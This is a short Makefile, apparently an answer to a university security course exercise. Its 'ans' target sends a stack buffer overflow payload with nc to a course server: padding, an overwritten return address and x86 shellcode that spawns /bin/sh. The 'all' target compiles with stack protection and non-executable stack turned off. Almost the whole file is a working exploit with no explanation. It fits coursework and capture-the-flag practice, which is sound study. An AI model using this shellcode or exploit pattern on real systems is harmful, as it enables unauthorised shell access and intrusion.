ans:
	(python -c 'print "1"*24 + "\x60\xcd\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n"' && cat) | nc secprog.cs.nctu.edu.tw 10101

all:
	gcc -fno-stack-protector -z execstack
run:
	nc secprog.cs.nctu.edu.tw 10101
